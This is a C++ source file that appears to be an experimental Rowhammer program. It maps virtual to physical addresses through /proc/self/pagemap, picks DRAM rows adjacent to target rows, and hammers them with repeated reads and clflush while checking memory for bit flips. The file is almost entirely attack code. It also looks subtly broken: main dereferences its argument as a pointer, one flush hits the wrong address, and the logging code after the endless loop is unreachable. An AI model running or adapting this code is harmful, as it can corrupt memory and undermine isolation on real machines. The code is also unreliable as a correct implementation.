#include <sys/ipc.h>
#include <sys/shm.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>
#include <linux/kernel-page-flags.h>
#define __STDC_FORMAT_MACROS
#include <assert.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <time.h>
#include <asm/unistd.h>
#include <fcntl.h>
#include<vector>
#include <algorithm>
#include <fstream>


using namespace std;

const size_t mem_size = 1 << 30;
const int toggles = 540000;
 
char *g_mem;


uint64_t getPhysicalAddress(char *g_mem, int pagemap)
{
	uint64_t page_frame_number = 0;
	uint64_t physical_address = 0;
	uint64_t value;
	int got1 = pread(pagemap, &value, 8, (reinterpret_cast<uintptr_t>((uint64_t*) g_mem) / 0x1000) * 8);
	assert(got1 == 8);
	page_frame_number = value & ((1ULL << 54)-1);
	physical_address = page_frame_number * 0x1000;
	return physical_address;
}



uint64_t getPhysical_Address(uint64_t *g_mem, int pagemap)
{
	uint64_t page_frame_number = 0;
	uint64_t physical_address = 0;
	uint64_t value;
	int got1 = pread(pagemap, &value, 8, (reinterpret_cast<uintptr_t>((uint64_t*) g_mem) / 0x1000) * 8);
	assert(got1 == 8);
	page_frame_number = value & ((1ULL << 54)-1);
	physical_address = page_frame_number * 0x1000;
	return physical_address;
}






int getBankNumber(uint64_t curnt)	{
	int ba0 = ((curnt >> 13) & 1) ^ ((curnt >> 17) & 1);
	int ba1 = ((curnt >> 14) & 1) ^ ((curnt >> 18) & 1);
	int ba2 = ((curnt >> 16) & 1) ^ ((curnt >> 20) & 1);
	int rank = ((curnt >> 15) & 1) ^ ((curnt >> 19) & 1);
	int bank = (rank << 3) + (ba2 << 2) + (ba1 << 1) + ba0;
	return bank;
}





void main_prog(vector<vector<long int> > &res,uint64_t *vaddress) 
{
  g_mem = (char *) mmap(NULL, mem_size, PROT_READ | PROT_WRITE,MAP_ANON | MAP_PRIVATE, -1, 0);
  assert(g_mem != MAP_FAILED);
  vector<int> targetaddress_indexes;
  memset(g_mem, 0xff, mem_size);
  int pagemap = open("/proc/self/pagemap", O_RDONLY);
  assert(pagemap >= 0);

  int temp;
  int c,b;
  uint64_t a;
  targetaddress_indexes.push_back(0);
  for(int i=0;i<mem_size;i=i+6000)
  {	
  	
	uint64_t phys1 = getPhysicalAddress((char *) (g_mem+i), pagemap);
  	int rn=((phys1 & 0x1fffc0000) >> 18);
  	int bn=getBankNumber(phys1);
  	for (int j = 0; j < res.size(); j++)
  	{
  		if ((bn==12) && (bn==res[j][0]) && (rn==res[j][1]-1 || rn==res[j][1]+1)) 
  		{
  			temp=targetaddress_indexes[targetaddress_indexes.size()-1];
  			uint64_t a = getPhysicalAddress((char *) (g_mem+temp), pagemap);
  			int b=((a & 0x1fffc0000) >> 18);
  			int c=getBankNumber(a);
  			if (!((b==rn) && (c==bn)))
  			{  				  			
  				targetaddress_indexes.push_back(i);
  				break;
  			}
  		}
  	
 	}
  
  }  
 
 
  printf("\nThe preprocessing is done..it is time to decide whether to continue with process or not..based ob the number of intersection rows\n\n");
  int intersection_rows=targetaddress_indexes.size();
  int choice;
  if (intersection_rows<200)
  {
  	
  	printf("The number of intersection(adjacent) rows are %d. There is very less to get an error. Better stop this and execute again.If you still want to continue..then follow the below 		process",intersection_rows); 
  	printf("\nenter any integer if you want to continue..enter ctrl+z if you want to stop this\n");
  	scanf("%d",&choice);
  }
  
  
  if ((intersection_rows>=200) && (intersection_rows<1000))
  {
  	
  	printf("The number of intersection(adjacent) rows are %d. There is some chance to get an error. Better stop this and execute again.If you still want to continue..then follow the below 		process\n\n",intersection_rows); 
  	printf("\nenter any integer if you want to continue..enter ctrl+z if you want to stop this\n");
  	scanf("%d",&choice);
  }
  
  if ((intersection_rows>=1000) && (intersection_rows<2000))
  {
  	
  	printf("The number of intersection(adjacent) rows are %d. There is some chance to get an error. Better stop this and execute again.If you still want to continue..then follow the below 		process\n\n",intersection_rows); 
  	printf("\nenter any integer if you want to continue..enter ctrl+z if you want to stop this\n");
  	scanf("%d",&choice);
  }

  if (intersection_rows>=2000) 
  {
  	
  	printf("The number of intersection(adjacent) rows are %d. There is good chance to get an error. Better continue with this process\n\n",intersection_rows); 
  	printf("\nenter any integer if you want to continue..enter ctrl+z if you want to stop this\n");
  	scanf("%d",&choice);
  }
  
  printf("\n here we go..the actual hammering started now");
  
  int sum=0;
  vector<char *> arr;
  int l=0;
  int rn2;
  int bn2;
  uint64_t phys2;
  while(1)
   {
	  for (int k=0;k<targetaddress_indexes.size();k=k+8)
	  {
	  	while(l<8 && (k+l)< targetaddress_indexes.size())
	  	{
	  		arr.push_back(g_mem + targetaddress_indexes[k+l]);
	  		l=l+1;
	  	}
	  	int y=0;
	  	while(y<l)
	  	{
	  		asm volatile("clflush (%0)" : : "r" (&targetaddress_indexes[k+l]) : "memory");
	  		y++;
	  	}
	  	y=0;
	  	sum=0;
	  	printf("\n\nthese are the rownumbers which are being hammered now\n\n");
	  	for (int j=0;j<arr.size();j++)
	  	{
	  		phys2 = getPhysicalAddress((char *) (arr[j]), pagemap);
	  		rn2=((phys2 & 0x1fffc0000) >> 18);
	  		int bn2=getBankNumber(phys2);
	  		printf("%d	%d	\n",bn2,rn2);
	  	}
	  	
	  	for (int x=0;x<540000;x++)
	  	{	
	  		for (int z=0;z<arr.size();z++)
	  		{		
		  		sum=sum+*(arr[z])+1;			  		
		  	}
		  	for (int z=0;z<arr.size();z++)
		  	{
		  		asm volatile("clflush (%0)" : : "r" (arr[z]) : "memory");
		  	}
		  	
	  	}
	  	arr.clear();
	  	l=0;
	  	  
		  
		  for (int k=0;k<100000000;k++)
		  {
		  	if(k==10)
		  	{
		  		printf("%0llx\n",(*(vaddress+k)));
		  	}
		  	
		  	if ((*(vaddress+k))!=~(uint64_t) 0)
		  	{
		  		
		  		printf("\n\nwe are succeeded with hammering\n\n");
		  		printf("\nwe got an error at address location %p\n",(vaddress+k));
		  		exit(1);
		  	}
		  }
 	}
 	
 	for(int h=0;h<1000;h++)
	{
		  printf("*");
	}
	
	ofstream myfile ("example.txt",ios_base::app);
	  if (myfile.is_open())
	  {
	  printf("\n12345");
	    myfile << "This is a line.\n";
	    myfile << "This is another line.\n";
	    for(int count = 0; count < targetaddress_indexes.size(); count ++){
		myfile << targetaddress_indexes[count] << "   " ;
	    }
	    myfile << "\n\n\n";
	    myfile.close();
	  }
	  else printf( "Unable to open file");
	
  }
}

 
int main(uint64_t *vaddress)
 {
 	printf("\nplease wait..preprocessing is being done. actual rowhammering is not started yet\n");
	int pagemap = open("/proc/self/pagemap", O_RDONLY);
	int rn;
	int bn;
	uint64_t phys;
	
	
	vector<vector<long int> > res;
	vector <long int> vec;
	assert(pagemap >= 0);
	for(long int i=0;i<100000000;i=i+500)
	{
		vec.clear();
		phys = getPhysical_Address((uint64_t *) (vaddress+i), pagemap);
		rn=((phys & 0x1fffc0000) >> 18);
		bn=getBankNumber(phys);
	
		vec.push_back(bn);
		vec.push_back(rn);
		res.push_back(vec);
	
	}
	
	
	res.erase(unique(res.begin(), res.end()), res.end());
	
	
	int pid = fork();
  	if (pid == 0)
  	 {
    		main_prog(res,vaddress);
    		_exit(1);
  	}

  	int status;
  	if (waitpid(pid, &status, 0) == pid)
  	 {
    		printf("** exited with status %i (0x%x)\n", status, status);
  	 }

  	for (;;) 
  	{
    		sleep(999);
  	}
	
	return 0;
}


